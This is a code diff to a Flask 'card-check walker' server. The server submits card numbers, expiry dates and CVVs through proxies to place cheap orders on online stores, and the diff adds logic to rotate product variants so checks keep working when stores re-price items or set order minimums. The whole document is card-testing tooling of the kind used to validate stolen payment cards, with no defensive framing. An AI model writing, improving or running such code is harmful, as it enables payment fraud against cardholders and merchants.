@@ -1,3 +1,4 @@
+import re
 """RZ API Server — Razorpay ₹1 card-check walker.
 
 Flask server on port 5003.
@@ -393,6 +394,8 @@ def sh2_check():
         return jsonify({"error": f"internal error: {type(e).__name__}"}), 500
     success, message, gateway, price, currency = res
     message = str(message)
+    if message == "DIGITAL_PRODUCT_CHURN":
+        message = "Site not supported (digital product re-priced)"
     msg_u = message.upper()
     if "ORDER_PLACED" in msg_u:
         status = "APPROVED"
@@ -423,24 +426,50 @@ def _sh2_run(cc, site, proxy, variant):
     if variant:
         return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None))
 
-    # pick the cheapest, then rotate to next-cheapest when a store re-prices one to $0
+    # pick the cheapest, then rotate when a store re-prices it to $0, churns a digital
+    # product, or rejects it via a store rule (VALIDATION_CUSTOM = minimum-order etc.)
     site_url = site if site.startswith("http") else f"https://{site}"
     try:
         info = _aio.run(_sfp(site_url, proxy or None))
     except Exception:
         info = None
-    cands = []
-    if isinstance(info, dict) and info.get("variant_id"):
-        cands = [info["variant_id"]] + list(info.get("candidates") or [])
-    if not cands:
+    if not isinstance(info, dict) or not info.get("variant_id"):
         return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, None, proxy or None))
 
+    tried = {info["variant_id"]}
+    cands = [{"id": info["variant_id"], "price": float(info.get("price") or 0)}]
+    cands += [c for c in (info.get("candidates") or []) if c["id"] not in tried]
+
     last = (False, "Unknown", "UNKNOWN", "0", "USD")
-    for vid in cands[:3]:
-        res = _aio.run(_sh2pc(ccn, mm, yy, cvv, site, vid, proxy or None))
+    idx = 0
+    while idx < len(cands) and idx < 6:
+        cand = cands[idx]
+        if cand["id"] in tried:
+            idx += 1
+            continue
+        tried.add(cand["id"])
+        res = _aio.run(_sh2pc(ccn, mm, yy, cvv, site, cand["id"], proxy or None))
         last = res
-        if "PAYMENTS_POSITIVE_AMOUNT_EXPECTED" not in str(res[1]):
+        msg = str(res[1])
+        if "PAYMENTS_POSITIVE_AMOUNT_EXPECTED" in msg or "DIGITAL_PRODUCT_CHURN" in msg:
+            idx += 1
+            continue
+        if "VALIDATION_CUSTOM" in msg:
+            # store rule (e.g. "less than the $12.00 minimum") — pick a variant
+            # priced above the store's minimum
+            _mm = re.search(r"\$([0-9][0-9.,]*)", msg)
+            if _mm:
+                try:
+                    need = float(_mm.group(1).replace(",", ""))
+                except ValueError:
+                    return res
+                nxt = next((c for c in cands if c["id"] not in tried and c["price"] >= need), None)
+                if nxt:
+                    cands.append({"id": nxt["id"], "price": nxt["price"]})
+                    idx = len(cands) - 1
+                    continue
             return res
+        return res
     return last
 
 
